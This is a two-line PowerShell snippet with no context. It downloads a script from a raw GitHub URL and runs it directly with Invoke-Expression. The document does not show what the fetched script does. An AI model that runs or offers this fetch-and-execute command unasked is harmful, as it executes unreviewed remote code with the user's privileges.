$script = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Krowne/PSInfo/refs/heads/main/m").Content
Invoke-Expression $script
